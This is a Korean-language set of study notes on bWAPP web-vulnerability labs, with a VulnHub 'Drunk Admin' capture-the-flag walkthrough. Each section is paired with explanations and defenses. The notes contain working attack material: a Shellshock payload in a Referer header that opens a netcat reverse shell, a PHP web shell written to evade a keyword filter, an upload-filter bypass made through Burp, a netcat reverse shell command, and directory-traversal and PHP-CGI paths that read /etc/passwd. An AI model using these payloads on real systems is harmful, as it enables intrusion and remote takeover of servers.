# 🛡️ bWAPP 취약점 학습 정리 (A6 후속 · A7) + VulnHub Drunk Admin Challenge

> 이전 README(A1~A4, A5/A6 SSL)에 이어, 오늘은 **A6의 남은 항목(HTML5 Web Storage)**, **A7(고급/복합 취약점 모음)**, 그리고 **VulnHub Drunk Admin Web Hacking Challenge**까지 한 번에 정리합니다.
>
> A7부터는 단일 취약점보다 **여러 단계를 거쳐야 셸/권한까지 도달하는 시나리오**가 많아졌고, VulnHub 챌린지는 처음엔 막혔지만 **Burp 인터셉트 단계에서 직접 파일명을 조작**해서 결국 우회에 성공한 케이스라 과정 자체를 자세히 남겨둡니다.

---

## 📑 목차

1. [A6 - HTML5 Web Storage](#a6---html5-web-storage)
2. [A7 요약표](#a7-요약표)
3. [A7 - 상세](#a7---상세)
4. [VulnHub - Drunk Admin Web Hacking Challenge](#vulnhub---drunk-admin-web-hacking-challenge)
5. [오늘의 회고](#오늘의-회고)

---

## A6 - HTML5 Web Storage

```html
<script>
    var str = "";

    for(var key in localStorage) {
        str += "<br>" + key + " = " + localStorage.getItem(key);
    }

    document.write(str);
</script>
```

**왜 이게 되는가**: `localStorage`는 브라우저 안에 키-값 형태로 데이터를 저장해두는 HTML5 기능입니다. 세션 토큰이나 사용자 설정 같은 걸 여기 저장해두는 사이트가 많은데, 문제는 **localStorage가 도메인 단위로만 격리될 뿐, 같은 페이지 안에서 실행되는 모든 스크립트는 자유롭게 읽을 수 있다**는 점입니다. 즉 XSS로 자바스크립트 실행 권한만 얻으면, `for...in` 루프로 저장된 **모든 key/value를 통째로 긁어서 화면에 뿌릴 수** 있습니다.

- XSS 입력폼(이름/성 필드 등)에 위 스크립트를 그대로 넣으면, 페이지가 로드되는 시점에 `document.write`가 실행되면서 localStorage에 들어있던 secret 값이 화면에 출력됩니다.
- `localStorage.getItem(key)` / `localStorage.setItem(key, value)`처럼 key-value를 직접 조작하는 식으로 폼 필드를 채우는 것도 같은 원리(저장된 값을 읽거나 덮어쓰기)로 동작합니다.

**왜 중요한가**: HttpOnly 쿠키는 자바스크립트에서 못 읽지만, **개발자가 "그럼 localStorage에 토큰을 저장하자"는 식으로 우회하면 오히려 더 쉽게 털립니다.** localStorage는 애초에 자바스크립트가 자유롭게 접근하도록 설계된 저장소라서 HttpOnly 같은 보호 장치 자체가 없습니다. **방어책**은 인증 토큰처럼 민감한 값은 localStorage/sessionStorage에 두지 않고, 가능한 한 HttpOnly+Secure 쿠키로 관리하는 것입니다. (애초에 XSS 자체를 막는 게 근본 대책이라는 점은 A3 때와 동일합니다.)

---

## A7 요약표

| # | 취약점 | 핵심 도구/명령어 | 한 줄 개념 |
|---|--------|------------------|------------|
| 1 | Directory Traversal - Directories | 주소창 `../` | 상위 디렉토리로 거슬러 올라가 디렉토리 구조를 노출 |
| 2 | Directory Traversal - Files | 주소창 `../../../etc/passwd` | 경로 조작으로 웹 루트 밖의 임의 파일을 읽음 |
| 3 | SQLite | - | 추후 실습 예정 |
| 4 | Restrict Folder Access | 직접 URL 접근 | 인증 여부와 무관하게 직접 링크로 파일 접근 가능 |
| 5 | CVE-2013-4890 | - | 추후 실습 예정 |
| 6 | CSRF | `<iframe>` 삽입 | 피해자 세션으로 의도치 않은 요청을 강제 실행 |
| 7 | Drupageddon (CVE-2014-3704) | `msfconsole`, SQLi | Drupal SQLi 체인 취약점으로 리버스 셸 획득 |
| 8 | CGI 옵션 (`cgi.fix_pathinfo`) | php.ini 설정 | 잘못된 경로 요청을 PHP 해석기에 그대로 넘기는 설계 결함 |
| 9 | PHP-CGI Argument Injection | `?-d auto_prepend_file=...` | CGI 쿼리스트링이 PHP 인터프리터 인자로 직접 주입됨 |
| 10 | Shellshock (CGI) | Bash 함수 정의 버그, Referer 헤더 | Bash 환경변수 파싱 결함으로 임의 명령 실행 |

---

## A7 - 상세

### 1~2. Directory Traversal (Directories / Files)

```
.../images/../
.../images/../../../etc/passwd
```

**왜 되는가**: 서버가 사용자 입력값(파일 경로 파라미터)을 **검증 없이 그대로 파일시스템 경로 조합에 사용**하기 때문입니다. `../`는 "한 단계 상위 디렉토리로"라는 의미를 가진 운영체제 차원의 경로 표기법인데, 애플리케이션이 이걸 필터링하지 않으면 웹 루트 안에 갇혀 있어야 할 요청이 시스템 전역으로 빠져나갑니다. `../../`처럼 반복할수록 더 상위(결국 루트 `/`)까지 올라갈 수 있고, 거기서 `etc/passwd`처럼 절대 경로를 알고 있는 파일을 지정하면 **권한 체크 없이 시스템 파일이 그대로 노출**됩니다.

**왜 중요한가**: `/etc/passwd`는 비밀번호 해시는 아니지만(요즘은 `/etc/shadow`에 분리), 시스템 계정 목록과 셸 종류가 드러나서 다음 공격(계정 추측, 권한상승)의 정찰 자료가 됩니다. **방어책**은 사용자 입력으로 받은 파일명/경로를 화이트리스트 검증하거나, `realpath()` 등으로 정규화한 뒤 웹 루트 밖으로 벗어나는지 검사하는 것입니다.

---

### 4. Restrict Folder Access

**증상**: PDF 같은 문서 파일의 직접 URL을 복사해서, **로그아웃한 상태**로 그 주소를 그대로 붙여넣어도 파일이 정상적으로 열림.

**원인**: 애플리케이션이 "메뉴에서 로그인한 사용자만 클릭할 수 있다"는 **UI 레벨의 접근 제어**만 걸어놓고, 실제로 파일을 서빙하는 서버(또는 디렉토리) 단에는 **인증 체크가 전혀 없는** 상태입니다. URL만 알면 누구나 그 리소스에 직접 접근할 수 있는, 전형적인 **"숨겨놨을 뿐 막아놓지 않은(security through obscurity)"** 설정 오류입니다.

**왜 중요한가**: URL은 북마크, 브라우저 히스토리, Referer 헤더, 공유 링크 등을 통해 인증 안 된 사람에게도 쉽게 노출될 수 있습니다. **방어책**은 정적 파일 서빙 자체를 애플리케이션 레벨 인증 체크를 거치는 라우트(예: `/download?id=`)로 감싸고, 웹서버가 해당 디렉토리를 직접 서빙하지 못하게 막는 것입니다.

---

### 6. CSRF (Cross-Site Request Forgery)

```html
<iframe src="현재_CSRF_취약_요청_URL"></iframe>
```

(A3 Stored XSS로 뚫었던 블로그 게시판에 위 코드를 게시)

**왜 되는가**: 이체/송금처럼 **GET 요청 하나로 상태를 바꾸는** 기능이 있고, 그 요청에 **CSRF 토큰 같은 검증값이 없다면**, 단순히 그 URL을 누군가 "보기만 해도"(iframe이 자동으로 로드되니까) 요청이 그대로 실행됩니다. 피해자가 이미 로그인된 세션 쿠키를 가지고 있는 상태에서 이 페이지를 보면, 브라우저는 자동으로 그 쿠키를 실어서 요청을 보내기 때문에 서버는 "본인이 직접 누른 요청"과 구분하지 못합니다.

이번 실습에서는 **Stored XSS(A3)와 결합**해서, 게시판 글 안에 iframe을 심어두는 것만으로 그 글을 보는 모든 사용자의 잔액이 자동으로 줄어드는 걸 확인했습니다 — **XSS가 CSRF 공격의 "배달 수단(delivery)"**이 된 셈입니다.

**왜 중요한가**: 인증(로그인 여부)만으로는 "이 요청이 사용자의 진짜 의도인지"를 보장하지 못합니다. **방어책**은 상태를 변경하는 모든 요청에 예측 불가능한 CSRF 토큰을 발급/검증하고, `SameSite=Strict/Lax` 쿠키 속성을 사용하며, 중요한 작업은 GET이 아닌 POST + 토큰으로만 처리하는 것입니다.

---

### 7. Drupageddon (CVE-2014-3704)

```bash
sudo msfconsole
search drupal
use 16
set rhost <타겟IP>
set targeturi /drupal/
run
```

**왜 되는가**: Drupal의 특정 버전에서, 사용자 입력이 **SQL 쿼리의 파라미터 배열 키(key) 부분에 검증 없이 들어가는** 구조적 결함이 있었습니다. 정상적인 SQLi는 보통 입력 "값"을 조작하지만, 이 취약점은 **쿼리 구조 자체(배열 키)를 조작**할 수 있어서 일반적인 입력값 이스케이프 처리로는 막히지 않았습니다. 그 결과 인증 없이도 임의 SQL 실행 → 관리자 계정 생성/수정까지 가능해서 "Drupageddon(Drupal+Armageddon)"이라는 별명이 붙었습니다.

- Metasploit 모듈로 자동 익스플로잇하면 바로 리버스 셸까지 받을 수 있고,
- 수동으로는 CVE-2014-3704 PoC 스크립트를 받아서 직접 URL/타겟을 수정해 실행하면 **admin/admin 계정을 새로 생성**해서 로그인하는 방식도 가능했습니다.

**왜 중요한가**: ORM/쿼리 빌더를 쓴다고 해서 SQLi가 무조건 안전한 게 아니라는 걸 보여주는 사례입니다. **값**만 이스케이프하고 **구조(키, 컬럼명 등)**는 검증하지 않으면 여전히 구멍이 남습니다. **방어책**은 해당 CVE에 대한 패치 적용, 입력값이 쿼리의 어느 위치(값/키/컬럼명)에 들어가든 동일한 수준으로 검증하는 것입니다.

---

### 8~9. CGI 옵션 & PHP-CGI Argument Injection (CVE-2012-1823 / CVE-2024-4577)

**CGI 옵션 핵심**:
- `cgi.fix_pathinfo`: 요청 경로가 정확히 일치하지 않을 때 "비슷한 파일을 찾아 강제 실행"하는 옵션. **반드시 0(비활성화)**으로 둬야 합니다. 1로 켜져 있으면 확장자 우회 같은 업로드 공격의 발판이 됩니다.
- `cgi.force_redirect`: PHP 실행 파일에 사용자가 웹서버를 거치지 않고 직접 접근하는 걸 차단.
- 결론적으로 **Nginx+PHP-FPM 조합에선 `cgi.fix_pathinfo=0` 하나만 확실히 챙기면** 대부분의 관련 문제는 막힙니다.

**Argument Injection 실습**:
```
/bWAPP/admin?-s
/bWAPP/admin?-d+auto_prepend_file%3d/etc/passwd
```
→ `/etc/passwd` 내용이 화면에 그대로 노출됨.

**왜 되는가**: PHP를 **CGI 모드**로 띄워놓으면, 일부 환경에서는 **쿼리스트링 자체가 PHP 인터프리터를 실행할 때의 커맨드라인 인자로 흘러들어가는** 설계 결함이 있습니다(Argument Injection). `-d auto_prepend_file=/etc/passwd`라는 PHP 명령행 옵션을 쿼리스트링으로 흉내 내서 보내면, 서버는 이걸 "URL 파라미터"가 아니라 **진짜 PHP 실행 옵션**으로 받아들여서, 모든 요청 처리 전에 `/etc/passwd`를 먼저 읽어 들여 출력해버립니다. CVE-2012-1823(구버전), CVE-2024-4577(Windows 인코딩 우회로 재발견된 최신 버전)이 같은 뿌리의 취약점입니다.

**왜 중요한가**: "URL 파라미터는 그냥 텍스트값일 뿐"이라는 가정이 깨지는 사례입니다 - 실행 환경(CGI)에 따라 **파라미터가 그대로 프로세스 실행 인자**가 될 수 있습니다. **방어책**은 PHP를 CGI가 아닌 PHP-FPM(FastCGI)으로 운영하고, 해당 CVE 패치를 적용하는 것입니다.

---

### 10. Shellshock (CVE-2014-6271, via CGI)

```bash
# Metasploit
show advanced
set header referer
set rhosts 172.16.11.216
set targeturi /bWAPP/cgi-bin/shellshock.sh

# Referer 헤더에 직접 넣을 경우
() { :; }; /bin/bash -c "nc <칼리_IP> 1234 -e /bin/bash"
```

**왜 되는가**: Bash는 **환경변수에 함수 정의를 저장할 수 있는** 기능이 있었는데, 함수 정의가 끝난 뒤에도 그 뒤에 붙은 **추가 명령어를 검증 없이 그대로 실행**해버리는 파싱 버그가 있었습니다. CGI 스크립트는 HTTP 헤더(User-Agent, Referer 등)를 **환경변수로 그대로 전달**하는 게 표준 동작이라서, 공격자가 Referer 헤더에 `() { :; }; <악성명령>` 형태의 문자열을 넣으면 CGI를 실행하는 Bash가 그 환경변수를 해석하는 과정에서 **악성 명령이 그대로 실행**됩니다.

**왜 중요한가**: 입력값 검증을 애플리케이션 코드에서 아무리 잘해도, **그 입력이 셸(Bash) 레벨에서 한 번 더 해석되는 경로**가 있으면 그 지점이 그대로 RCE로 직결됩니다. HTTP 헤더처럼 "당연히 안전하다고 여겨지던 채널"이 공격 벡터가 된 대표 사례입니다. **방어책**은 Bash를 패치된 버전으로 업데이트하고, CGI 사용을 최소화하는 것입니다.

---

## VulnHub - Drunk Admin Web Hacking Challenge

### 정찰
```bash
sudo nmap -p- 172.16.11.218 -Pn -vv
```
→ 22(SSH), 8880(HTTP) 오픈 확인. 8880에 이미지 호스팅 서비스(Tripios)가 떠 있음.

### 시도 1 - 더블 익스텐션만으로 업로드 (실패)

처음에는 다른 라이트업들처럼 `image.png.php`를 그대로 업로드하고, 확장자 없는 `/images/해시값` 주소로 접속하면 PHP가 바로 실행될 거라 기대했습니다. 그런데 응답을 까보니:

```
Content-Type: image/png
Vary: negotiate
TCN: choice
```

서버가 Apache의 **content negotiation(MultiViews)** 기능으로 `해시값.png` 파일을 정적으로 골라서 내려주고 있었고, `<?php echo exec('whoami') ?>` 코드는 실행되지 않고 텍스트 그대로 노출됐습니다. `/images/해시값.php`로 직접 접근하면 `.htaccess`가 `.php`로 끝나는 요청을 403으로 차단. 즉 **이 서버는 더블 익스텐션으로 올려도 실제로는 `.png`로만 저장**한다는 게 확인됐습니다. (확장자 순서를 `php.png`로 뒤집어봐도 결과는 동일하게 `.png`로 저장됨.)

### 시도 2 - Burp 인터셉트로 직접 확장자 조작 (성공!)

막힌 지점을 뚫은 방법은 **업로드 요청을 Burp로 가로채서, 전송되는 순간 파일명에서 `.php` 부분을 직접 지워버리는** 것이었습니다.

1. `vi`로 `image.png.php` 파일 생성, 내용은:
   ```php
   <?php echo exec('id') ?>
   ```
2. Burp **Intercept를 켠 상태**로 업로드 폼에서 이 파일을 전송.
3. 가로챈 요청에서 `filename="image.png.php"` 부분의 **`.php`를 직접 지움** (서버 쪽 필터가 검사하는 시점/방식과, 실제 저장 로직이 참조하는 파일명 처리 지점이 어긋나 있어서, 요청을 가공해 보내면 필터를 우회하면서도 원하는 형태로 저장시킬 수 있었던 것으로 추정됩니다.)
4. 수정한 상태로 **Forward**. → "Your cool image"로 정상 업로드됨.
5. **핵심 주의사항**: Intercept를 끄기 전에 Forward할 때, 그 응답에 담긴 **`Set-Cookie: trypios=...` 값을 그 자리에서 바로 복사해둬야** 합니다. (Intercept 끄고 나서 다시 찾으려 하면 값이 휘발되거나 헷갈려서 한참 헤맸던 부분.)

### 시도 3 - 명령어 실행 페이로드로 업그레이드

```php
<?php echo exec($_REQUEST['cmd']) ?>
```
이 코드를 `r.png.php`로 저장해서 같은 방식(시도 2의 Burp 인터셉트 + 확장자 조작)으로 업로드. `$_GET`이 아니라 `$_REQUEST`를 쓴 이유는, 필터가 `$_GET`/`$_POST` 같은 키워드를 블랙리스트로 잡아내는 걸 우회하기 위함입니다 (이전 라이트업들에서도 같은 패턴 확인됨).

업로드 직후 응답의 새 쿠키값을 저장해두고, 주소창에:
```
http://172.16.11.218:8880/images/<해시값>?cmd=id
```
→ `id` 명령 실행 결과가 그대로 출력됨. RCE 확정.

### 시도 4 - 리버스 셸

```
?cmd=nc -c /bin/sh 172.16.11.213 5555
```
칼리 쪽에서 미리 리스너를 켜둔 상태로 위 URL을 호출:
```bash
nc -vvnlp 5555
```
→ 연결 성공, `www-data` 권한 셸 획득.

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```
→ TTY 업그레이드 (제대로 된 인터랙티브 셸로 전환, 방향키/탭완성 등 사용 가능).

### 시도 5 - 비밀 메시지 찾기

```bash
cat .proof
```
→ `/var/www` 디렉토리에 숨겨진 `.proof` 파일 발견, 그 안에 인코딩된 Secret Code 확인.

- 첫 번째로 **Base64**라는 걸 알아내서 1차 디코딩.
- 그 결과를 **한 번 더 디코딩**해야 진짜 평문이 나옴 (단순 Base64 한 겹이 아니라, 추가 암호화/인코딩이 한 단계 더 걸려있었음).
- `/etc/passwd`를 확인해서 `bob` 계정 존재를 파악하고, 주소창에 `http://<주소>:8880/~bob`으로 접속 → bob의 홈 디렉토리 안 `public_html`에 있던 **암호화/복호화 스크립트**를 이용해 최종 메시지(좌표/약속 메시지) 복원에 성공.

<img width="1053" height="269" alt="스크린샷 2026-06-30 170115" src="https://github.com/user-attachments/assets/4e4710f5-be9c-49aa-9780-9e724a7b8a3f" />


---

